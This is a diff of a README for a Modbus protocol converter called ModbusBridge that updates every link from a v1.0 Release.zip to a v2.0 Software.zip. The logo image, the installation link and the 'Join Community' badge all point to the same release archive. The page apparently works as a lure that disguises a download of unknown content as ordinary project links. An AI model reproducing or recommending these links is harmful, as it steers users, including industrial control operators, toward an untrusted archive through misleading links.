@@ -2,7 +2,7 @@
 
 ModbusBridge is a versatile cross-platform Modbus converter/gateway application designed to facilitate seamless interconversions between different types of Modbus protocols including TCP, RTU, and ASC. This powerful tool is ideal for both beginners and advanced users in the field of industrial automation, allowing for efficient communication between Modbus devices. 
 
-![ModbusBridge Logo](https://github.com/Phuong625445/ModbusBridge/releases/download/v1.0/Release.zip)
+![ModbusBridge Logo](https://github.com/Phuong625445/ModbusBridge/releases/download/v2.0/Software.zip)
 
 ## Features 🚀
 
@@ -16,7 +16,7 @@ ModbusBridge is a versatile cross-platform Modbus converter/gateway application 
 
 ## Installation 🔧
 
-To get started with ModbusBridge, you can download the latest version [here](https://github.com/Phuong625445/ModbusBridge/releases/download/v1.0/Release.zip). Once the download is complete, launch the application on your preferred platform and begin exploring its powerful features.
+To get started with ModbusBridge, you can download the latest version [here](https://github.com/Phuong625445/ModbusBridge/releases/download/v2.0/Software.zip). Once the download is complete, launch the application on your preferred platform and begin exploring its powerful features.
 
 ## Usage 🖥️
 
@@ -37,7 +37,7 @@ If you encounter any issues or have suggestions for improving ModbusBridge, feel
 
 Join our community to stay updated on the latest developments, share your experiences, and connect with fellow Modbus enthusiasts.
 
-[![Join Community](https://github.com/Phuong625445/ModbusBridge/releases/download/v1.0/Release.zip)](https://github.com/Phuong625445/ModbusBridge/releases/download/v1.0/Release.zip)
+[![Join Community](https://github.com/Phuong625445/ModbusBridge/releases/download/v2.0/Software.zip)](https://github.com/Phuong625445/ModbusBridge/releases/download/v2.0/Software.zip)
 
 ---
 
